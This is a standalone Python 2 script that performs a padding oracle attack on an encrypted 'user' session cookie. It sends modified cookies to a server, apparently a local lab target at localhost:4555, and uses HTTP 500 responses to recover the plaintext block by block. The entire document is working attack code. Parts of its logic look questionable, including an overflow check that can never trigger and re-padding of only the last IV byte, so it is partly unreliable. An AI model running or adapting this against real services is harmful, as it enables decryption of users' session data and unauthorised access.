#!/usr/bin/env python

import requests
import base64
import sys

URL = 'http://localhost:4555'
padding = bytearray([15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16])

def test(cookie):
    encode = base64.b64encode(cookie)

    r = requests.get(URL, cookies={'user': encode})

    return r.status_code != 500

def decryptByte(old_iv, cookie):
    iv = bytearray(16)

    for i in range(15, -1, -1):
        #cycle through to get next value
        while not test(iv + cookie):
            iv[i] += 1
            if iv[i] > 255:
                print "This should not have happened"

        if i > 0:
            #undo padding on last byte
            iv[15] = iv[15] ^ (16 - i)
            #apply new padding on last byte
            iv[15] = iv[15] ^ (16 - i + 1)


    #build intermediate out of iv and padding
    intermediate = bytearray(16)
    for i in range(16):
        intermediate[i] = iv[i] ^ padding[i]


    #build plaintext out of cypher text and intermediate
    plaintext = bytearray(16)
    for i in range(16):
        plaintext[i] = intermediate[i] ^ old_iv[i]


    return plaintext

def removePadding(lastByte):
    paddingStart = 16-lastByte[-1]
    return lastByte[:paddingStart]


def main():
    if len(sys.argv) < 2:
        print "Usage: ./decrypt <cookie>"
        sys.exit(0)

    encrypted =  sys.argv[1]


    cookieFull =  base64.b64decode(encrypted)
    cookies = [bytearray(cookieFull[i:i+16]) for i in range(0, len(cookieFull), 16)]

    plaintext = ""
    for i in range(len(cookies)-1):
        decrypted = decryptByte(cookies[i][:16], cookies[i+1][:16])
        if i == len(cookies)-2:
            decrypted = removePadding(decrypted)
        plaintext += ''.join(chr(x) for x in decrypted)

    print plaintext


if __name__ == '__main__':
    main()